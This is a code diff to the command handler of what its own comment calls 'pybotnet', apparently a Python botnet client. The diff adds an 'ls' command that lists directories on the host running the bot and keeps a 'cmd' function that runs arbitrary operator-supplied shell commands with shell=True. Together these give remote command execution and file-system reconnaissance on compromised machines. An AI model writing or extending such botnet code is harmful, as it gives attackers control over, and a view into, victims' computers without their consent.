@@ -2,6 +2,7 @@
 
 from time import sleep
 from subprocess import check_output
+from os import listdir
 
 # pybotnet import
 import util
@@ -9,7 +10,8 @@ import util
 scripts_name = {
     "do_sleep": 'do_sleep <scconds> <message>',
     "get_info": 'get_info',
-    "cmd": 'cmd <command>'
+    "cmd": 'cmd <command>',
+    "ls": 'ls <route>'
 }
 
 
@@ -40,6 +42,9 @@ def execute_scripts(command, pybotnet_up_time, logger):
 
         elif command_name == 'cmd':
             return execute_cmd(command, logger)
+
+        elif command_name == 'ls':
+            return execute_ls(command, logger)
 
     logger.error('invalid command; Wrong format')
     return 'invalid command; Wrong format'
@@ -91,10 +96,31 @@ def execute_cmd(command, logger) -> str:
         return 'cmd error'
 
 
-def cmd(cmd,  logger) -> str:
-    logger.info(f'try to run: {cmd}')
+def cmd(command,  logger) -> str:
+    logger.info(f'try to run: {command}')
 
-    output = check_output(cmd, shell=True)
+    output = check_output(command, shell=True)
     return str(output).replace('\\r\\n', '\n')  # cleaning data
 
     # TODO: add timeout
+
+
+def execute_ls(command, logger) -> str:
+    command = split_command(command)
+
+    logger.info('execute ls')
+
+    try:
+        return ls(command[1])
+    except:
+        return ls('.')
+
+
+def ls(route: str) -> str:
+    try:
+        return listdir(route)
+
+    except FileNotFoundError as error:
+        return f'ls {error}'
+    except:
+        return 'ls Unknown error'
